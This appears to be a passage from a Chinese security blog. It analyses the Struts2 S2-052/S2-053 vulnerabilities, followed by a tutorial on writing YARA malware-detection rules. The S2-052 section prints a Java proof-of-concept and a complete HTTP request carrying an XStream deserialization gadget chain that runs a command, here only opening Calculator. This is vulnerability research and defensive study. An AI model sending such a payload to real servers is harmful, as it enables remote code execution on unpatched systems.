<p><img src="/2017/09/17/struts-052和struts-053分析/technique.png" alt=""><br>如上图所示，可以看到当转换发生异常的时候,就会执行start的操作。<br>介于此，我们的payload就可以这么写了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">import java.io.IOException;</div><div class="line">public class PoC_XMLGenerator &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) &#123;</div><div class="line">		// TODO Auto-generated method stub</div><div class="line"></div><div class="line">		String process = &quot;open&quot;; 		</div><div class="line">		String arguments = &quot;/Applications/Calculator.app&quot;;		</div><div class="line">		</div><div class="line">		String payload = &quot;&lt;sorted-set&gt;&quot; +  </div><div class="line">						 //&quot;&lt;string&gt;foo&lt;/string&gt;&quot; +</div><div class="line">						 &quot;&lt;dynamic-proxy&gt;&quot; + </div><div class="line">						 &quot;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&quot; +</div><div class="line">						 &quot;&lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;&quot; +</div><div class="line">						 &quot;    &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot; +</div><div class="line">						 &quot;         &lt;command&gt;&quot; +</div><div class="line">						 &quot;             &lt;string&gt;&quot; + process + &quot;&lt;/string&gt;&quot; +</div><div class="line">						 &quot;             &lt;string&gt;&quot; + arguments + &quot;&lt;/string&gt;&quot; +</div><div class="line">						 &quot;        &lt;/command&gt;&quot; +</div><div class="line">						 &quot;    &lt;/target&gt;&quot; +</div><div class="line">						 &quot;    &lt;action&gt;start&lt;/action&gt;&quot; +</div><div class="line">						 &quot;&lt;/handler&gt;&quot; + </div><div class="line">						 &quot;&lt;/dynamic-proxy&gt;&quot; + 						</div><div class="line">						&quot;&lt;/sorted-set&gt;&quot;;</div><div class="line">		</div><div class="line">		XMLGenerator.generateTOfromXML(payload);</div><div class="line">		</div><div class="line">		System.out.println(&quot;Will not get here&quot;);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>至此，XStream的利用点分析完了。下面再来看看struts2中的利用。<br><br>通过官方的一句话公告 A RCE attack is possible when using the Struts REST plugin with XStream handler to deserialise XML requests可以看出问题出在struts rest plugin，这个REST插件struts2-rest-plugin.jar用到了XStreamHandler这个类，这个类对http请求中content-type是application/xml的，会调用XStream进行处理。<br><img src="/2017/09/17/struts-052和struts-053分析/s2rest.png" alt=""><br>可以看到，当contenttype为xml的时候的处理类是XStreamHandler。那么我们就可以将恶意代码以xml为载体，通过Content-type为xml的方式，让XStreamHandler去进行序列化，那么这个时候就会触发漏洞。<br><br>最终payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3 HTTP/1.1</div><div class="line">Host: localhost:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2430</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;open&lt;/string&gt;</div><div class="line">                        &lt;string&gt;/Applications/Calculator.app&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure></p>
<p><img src="/2017/09/17/struts-052和struts-053分析/exp.png" alt=""></p>
<ul>
<li>补丁对比<br><a href="https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264" target="_blank" rel="external">补丁代码</a><h4 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h4></li>
<li>关于s2-053的漏洞问题是安全编码和习惯的问题,而非struts2通杀漏洞。<br><br><a href="http://struts.apache.org/docs/s2-053.html" target="_blank" rel="external">官方通告</a><br><img src="/2017/09/17/struts-052和struts-053分析/s2-053.png" alt=""></li>
<li>较s2-052，s2-053漏洞更简单和直接。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
<li><del>我还是喜欢用eclipse分析java漏洞。</del>，还是好像还是idea比较好用啊，只是从eclipse切换过来略蛋疼。切换过来之后，你会发现你的ide好像都要是JetBrains这个公司的了。</li>
<li>基础还是不够牢固，给自己定个小计划，后面有时间把所有的s2漏洞分析一下。总结一下思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li>Standard way to serialize and deserialize Objects with XStream<br><a href="http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o" target="_blank" rel="external">http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o</a></li>
<li>一步一步的构造payload<br><a href="https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java" target="_blank" rel="external">https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java</a></li>
<li>XStream “Remote Code Execution” exploit on code from “Standard way to serialize and deserialize Objects with XStream” article<br><a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1" target="_blank" rel="external">http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1</a></li>
<li>Struts2 S2-052 RCE分析与利用<br><a href="https://paper.seebug.org/383/" target="_blank" rel="external">https://paper.seebug.org/383/</a></li>
<li>CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告<br><a href="https://yq.aliyun.com/articles/197926" target="_blank" rel="external">https://yq.aliyun.com/articles/197926</a></li>
<li>S2-052漏洞分析及官方缓解措施无效验证<br><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="external">http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/</a></li>
<li>Struts2 S2-052漏洞分析<br><a href="https://www.waitalone.cn/struts2-s2-052.html" target="_blank" rel="external">https://www.waitalone.cn/struts2-s2-052.html</a></li>
<li>Struts2-052漏洞分析<br><a href="https://yaofeifly.github.io/2017/09/08/Struts2-052/" target="_blank" rel="external">https://yaofeifly.github.io/2017/09/08/Struts2-052/</a></li>
<li>Apache Struts2 Remote Code Execution (S2-053)<br><a href="http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/" target="_blank" rel="external">http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/</a></li>
<li>S2-053 复现分析过程(附POC)<br><a href="https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA" target="_blank" rel="external">https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA</a></li>
<li>Struts 2 S2-053漏洞分析（附POC）<br><a href="http://www.freebuf.com/vuls/147735.html" target="_blank" rel="external">http://www.freebuf.com/vuls/147735.html</a></li>
<li>来自McAfee对s2-052的分析<br><a href="https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/" target="_blank" rel="external">https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/</a></li>
<li>GCC 合并了我写的代码，从编译器开始解决安全问题。来自嘶吼，作者为吴潍浠<br><a href="http://www.4hou.com/binary/7688.html" target="_blank" rel="external">http://www.4hou.com/binary/7688.html</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/06/yara使用说明/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/09/06/yara使用说明/" itemprop="url">
                  yara使用说明
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul>
<li>yara工具用来帮助安全研究人员鉴别和对恶意软件进行分类的工具。我们可以通过编写规则来进行恶意软件的识别。<h4 id="yara-规则"><a href="#yara-规则" class="headerlink" title="yara 规则"></a>yara 规则</h4><a href="http://yara.readthedocs.io/en/v3.6.3/index.html" target="_blank" rel="external">最新规则官方文档V3.6.3</a><br><br>规则示例：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">rule silent_banker : banker</div><div class="line">&#123;</div><div class="line">    meta:</div><div class="line">        description = &quot;This is just an example&quot;</div><div class="line">        thread_level = 3</div><div class="line">        in_the_wild = true</div><div class="line">    strings:</div><div class="line">        $a = &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125;</div><div class="line">        $b = &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125;</div><div class="line">        $c = &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;</div><div class="line">    condition:</div><div class="line">        $a or $b or $c</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个就是一个名为rule silent_banker的规则，其中banker是规则的tag字段(可以有多个tag)，meta字段是规则的描述信息，strings是规则字段，condition则是条件判断的字段，这个规则的意思就是只要满足了字符串或a或b或c就会命中规则。<br>这里只是一个简单的规则，规则的创建可以使用通配符、大小写非敏感的字符串、正则表达式、特殊的操作符号等其它的特征。<br>通过python使用yara<br><img src="/2017/09/06/yara使用说明/yarapython.png" alt=""><br><img src="/2017/09/06/yara使用说明/help.png" alt=""><br>yara语法<br><br>silent-_banker叫做identifiers，是大小写敏感的且不能超过128个字符，且不能用以下的关键词，因为这些是yara的关键词<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">all	and	any	ascii	at	condition	contains</div><div class="line">entrypoint	false	filesize	fullword	for	global	in</div><div class="line">import	include	int8	int16	int32	int8be	int16be</div><div class="line">int32be	matches	meta	nocase	not	or	of</div><div class="line">private	rule	strings	them	true	uint8	uint16</div><div class="line">uint32	uint8be	uint16be	uint32be	wide</div></pre></td></tr></table></figure></p>
<p>字符串可以是文本字符串也可以是十六进制，ascii类型的使用双引号包裹，十六进制字符串使用大括号包裹。<br><br>注释语法和c语言相同。<br></p>
<p>* 三种string；<br><br>1.文本类型字符串<br><br>2.十六进制字符串<br><br>3.正则表达式</p>
<ul>
<li>十六进制Example<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">rule AlternativesExample1</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">       $hex_string = &#123; F4 23 ( 62 B4 | 56 ) 45 &#125;</div><div class="line"></div><div class="line">    condition:</div><div class="line">       $hex_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>valid<br>F42362B445或者F4235645</p>
<ul>
<li>字符串Example<br><br>默认是敏感的,但是可以通过nocase关键字设置成不敏感的<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">rule CaseInsensitiveTextExample</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $text_string = &quot;foobar&quot; nocase</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $text_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这样Foobar, FOOBAR, and fOoBaR都会被匹配到。</p>
<ul>
<li><p>宽字节的匹配<br><br>一个字符占两个字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">rule WideCharTextExample1</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $wide_string = &quot;Borland&quot; wide</div><div class="line"></div><div class="line">    condition:</div><div class="line">       $wide_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>fullword关键词<br><br>rule WideCharTextExample1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $fullword_string = &quot;domain&quot; fullword</div><div class="line"></div><div class="line">    condition:</div><div class="line">       $fullword_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>www.mydomain.com  www.my-domain.com www.domain.com</p>
<ul>
<li>正则表达式<br><br>使用斜线包裹，而非双引号或者大括号。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> rule RegExpExample1</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $re1 = /md5: [0-9a-fA-F]&#123;32&#125;/</div><div class="line">        $re2 = /state: (on|off)/</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $re1 and $re2</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2017/09/06/yara使用说明/rerule.png" alt=""></p>
<ul>
<li><p>条件判断语句Conditions<br><br>可以没有特征strings但是不能没有strings字段<br><br>可以设定特征出现的次数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> rule CountExample</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $a = &quot;dummy1&quot;</div><div class="line">        $b = &quot;dummy2&quot;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        #a == 6 and #b &gt; 10</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>偏移地址offset</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">rule InExample</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $a = &quot;dummy1&quot;</div><div class="line">        $b = &quot;dummy2&quot;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $a in (0..100) and $b in (100..filesize)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>特征a出现在0-0x100偏移且特征b出现在0x100之后。</p>
<ul>
<li>文件大小<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> rule FileSizeExample</div><div class="line">&#123;</div><div class="line">    condition:</div><div class="line">       filesize &gt; 200KB</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个只能匹配文件，如果是运行着的程序的话，那么将永远不会匹配，因为这个时候filesize没有意义。</p>
<ul>
<li>特定位置的数据获取<br>PE文件的判断<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> rule IsPE</div><div class="line">&#123;</div><div class="line">  condition:</div><div class="line">     // MZ signature at offset 0 and ...</div><div class="line">     uint16(0) == 0x5A4D and</div><div class="line">     // ... PE signature at offset stored in MZ header at 0x3C</div><div class="line">     uint32(uint32(0x3C)) == 0x00004550</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>PE文件结构中的前两个字节是DOS签名5A4D,即“MZ”。</p>
<ul>
<li><p>特征集合<br>rule OfExample1<br>{<br>strings:</p>
<pre><code>$a = &quot;dummy1&quot;
$b = &quot;dummy2&quot;
$c = &quot;dummy3&quot;
</code></pre><p>condition:</p>
<pre><code>2 of ($a,$b,$c)
</code></pre><p>}<br>满足两个特征即可</p>
</li>
</ul>
</li>
<li><p>引用其他规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">rule Rule1</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $a = &quot;dummy1&quot;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $a</div><div class="line">&#125;</div><div class="line"></div><div class="line">rule Rule2</div><div class="line">&#123;</div><div class="line">    strings:</div><div class="line">        $a = &quot;dummy2&quot;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $a and Rule1</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>全局规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">global rule SizeLimit</div><div class="line">&#123;</div><div class="line">    condition:</div><div class="line">        filesize &lt; 2MB</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>规则标签<br>方便对输出的信息进行归类。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">rule TagsExample1 : Foo Bar Baz</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line"></div><div class="line">rule TagsExample2 : Bar</div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>Metadata</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">rule MetadataExample</div><div class="line">&#123;</div><div class="line">    meta:</div><div class="line">        my_identifier_1 = &quot;Some string data&quot;</div><div class="line">        my_identifier_2 = 24</div><div class="line">        my_identifier_3 = true</div><div class="line"></div><div class="line">    strings:</div><div class="line">        $my_text_string = &quot;text here&quot;</div><div class="line">        $my_hex_string = &#123; E2 34 A1 C8 23 FB &#125;</div><div class="line"></div><div class="line">    condition:</div><div class="line">        $my_text_string or $my_hex_string</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>模块引用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">import &quot;pe&quot;</div><div class="line"></div><div class="line">rule Test</div><div class="line">&#123;</div><div class="line">  strings:</div><div class="line">      $a = &quot;some string&quot;</div><div class="line"></div><div class="line">  condition:</div><div class="line">      $a and pe.entry_point == 0x1000</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>文件包含</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include &quot;other.yar&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul>
<li>容易踩坑的点<br>当进程扫描的时候，这时是没有filesize属性的，也就永远不会满足的。此外还有通过文件偏移来判断PE也是不可行的。</li>
<li>web<br><a href="https://github.com/Tigzy/yaraeditor" target="_blank" rel="external">https://github.com/Tigzy/yaraeditor</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="http://www.freebuf.com/articles/system/26373.html" target="_blank" rel="external">恶意软件模式匹配利器 – YARA</a><br><a href="http://www.freebuf.com/articles/96903.html" target="_blank" rel="external">YARA：抗击恶意代码的神兵利器</a><br><a href="https://www.aldeid.com/wiki/Pescanner" target="_blank" rel="external">PEScanner</a><br><a href="https://github.com/Neo23x0/yarGen" target="_blank" rel="external">yara规则自动生成</a><br><a href="https://countuponsecurity.com/tag/pescanner-py/" target="_blank" rel="external">UNLEASHING YARA – PART 2</a><br><a href="http://www.freebuf.com/sectool/92399.html" target="_blank" rel="external">教你构建自己的yara数据库</a><br><a href="https://github.com/Neo23x0/yarAnalyzer" target="_blank" rel="external">yarAnalyzer</a><br><a href="http://www.aptno1.com/YC/249.html" target="_blank" rel="external">yara简介及API解析</a><br><a href="http://blog.csdn.net/wowolook/article/details/44307283" target="_blank" rel="external">两个开源恶意代码的查杀引擎 clamav yara</a><br><a href="http://bruteforcelab.com/yara-a-beginners-guide.html" target="_blank" rel="external">http://bruteforcelab.com/yara-a-beginners-guide.html</a><br><a href="https://blog.malwarebytes.com/threat-analysis/2013/10/using-yara-to-attribute-malware/" target="_blank" rel="external">https://blog.malwarebytes.com/threat-analysis/2013/10/using-yara-to-attribute-malware/</a><br><a href="https://securityintelligence.com/signature-based-detection-with-yara/" target="_blank" rel="external">https://securityintelligence.com/signature-based-detection-with-yara/</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/31/defcon-25-workshop代码解读-partII/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/08/31/defcon-25-workshop代码解读-partII/" itemprop="url">
                  defcon-25-workshop代码解读 partII
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
